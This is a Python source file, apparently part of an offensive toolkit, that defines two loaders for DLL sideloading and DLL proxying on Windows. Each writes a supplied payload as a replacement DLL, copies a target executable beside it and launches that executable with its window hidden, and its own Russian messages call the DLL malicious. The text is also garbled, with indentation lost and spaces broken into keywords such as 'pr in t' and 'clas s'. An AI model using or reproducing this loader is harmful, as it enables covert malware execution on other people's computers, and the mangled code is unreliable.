import os



import shutil



import tempfile



import subprocess



from typ in gimport List,Dict,Any,Union,Optional







from core.interfacesimport Bas eLoader







clas sDllSideload in gLoader(Bas eLoader):











def__init__(self):



        self.temp_dir=None







defload(self,payload:bytes,target_process:str=None,**kwargs)->bool:







dll_name=kwargs.get("dll_name")



prepare_only=kwargs.get("prepare_only",False)



output_dir=kwargs.get("output_dir")







if notdll_name:



            raiseValueError("Необходимо указать имя DLL для подмены (dll_name)")







if nottarget_process:



            raiseValueError("Необходимо указать целевой процесс для Sideload in g")











if output_dir:



            self.temp_dir=output_dir



os.makedirs(self.temp_dir,exist_ok=True)



else:



            self.temp_dir=tempfile.mkdtemp()











malicious_dll_path=os.path.join(self.temp_dir,dll_name)



withopen(malicious_dll_path,"wb")as f:



            f.write(payload)











target_exe_name=os.path.bas ename(target_process)



target_exe_path=os.path.join(self.temp_dir,target_exe_name)







try:



            shutil.copy2(target_process,target_exe_path)



except Exceptionas e:



            raiseRuntimeError(f"Не удалось скопировать целевой процесс: {str(e)}")







pr in t(f"DLL Sideload in g подготовлен:")



pr in t(f"- Целевой процесс: {target_exe_path}")



pr in t(f"- Вредоносная DLL: {malicious_dll_path}")



pr in t(f"- Директория: {self.temp_dir}")











if notprepare_only:



            try:







                startup in fo=subprocess.STARTUPINFO()



startup in fo.dwFlags|=subprocess.STARTF_USESHOWWINDOW



startup in fo.wShowW in dow=0







subprocess.Popen(



target_exe_path,



cwd=self.temp_dir,



startup in fo=startup in fo



)







pr in t(f"Процесс {target_exe_name} запущен")



return True



except Exceptionas e:



                pr in t(f"Ошибка при запуске процесса: {str(e)}")



return False







return True







defsupported_platforms(self)->List[str]:







return["w in dows"]







clas sDllProxyLoader(Bas eLoader):











def__init__(self):



        self.temp_dir=None







defload(self,payload:bytes,target_process:str=None,**kwargs)->bool:







dll_name=kwargs.get("dll_name")



orig in al_dll=kwargs.get("orig in al_dll")



prepare_only=kwargs.get("prepare_only",False)



output_dir=kwargs.get("output_dir")







if notdll_name:



            raiseValueError("Необходимо указать имя DLL для подмены (dll_name)")







if notorig in al_dll:



            raiseValueError("Необходимо указать путь к оригинальной DLL (orig in al_dll)")







if nottarget_process:



            raiseValueError("Необходимо указать целевой процесс для Proxy in g")











if output_dir:



            self.temp_dir=output_dir



os.makedirs(self.temp_dir,exist_ok=True)



else:



            self.temp_dir=tempfile.mkdtemp()











proxy_origin_name=f"{os.path.splitext(dll_name)[0]}_orig in al.dll"



proxy_origin_path=os.path.join(self.temp_dir,proxy_origin_name)







try:



            shutil.copy2(orig in al_dll,proxy_origin_path)



except Exceptionas e:



            raiseRuntimeError(f"Не удалось скопировать оригинальную DLL: {str(e)}")











proxy_dll_path=os.path.join(self.temp_dir,dll_name)



withopen(proxy_dll_path,"wb")as f:



            f.write(payload)











target_exe_name=os.path.bas ename(target_process)



target_exe_path=os.path.join(self.temp_dir,target_exe_name)







try:



            shutil.copy2(target_process,target_exe_path)



except Exceptionas e:



            raiseRuntimeError(f"Не удалось скопировать целевой процесс: {str(e)}")







pr in t(f"DLL Proxy in g подготовлен:")



pr in t(f"- Целевой процесс: {target_exe_path}")



pr in t(f"- Вредоносная DLL-прокси: {proxy_dll_path}")



pr in t(f"- Оригинальная DLL: {proxy_origin_path}")



pr in t(f"- Директория: {self.temp_dir}")











if notprepare_only:



            try:







                startup in fo=subprocess.STARTUPINFO()



startup in fo.dwFlags|=subprocess.STARTF_USESHOWWINDOW



startup in fo.wShowW in dow=0







subprocess.Popen(



target_exe_path,



cwd=self.temp_dir,



startup in fo=startup in fo



)







pr in t(f"Процесс {target_exe_name} запущен")



return True



except Exceptionas e:



                pr in t(f"Ошибка при запуске процесса: {str(e)}")



return False







return True







defsupported_platforms(self)->List[str]:







return["w in dows"]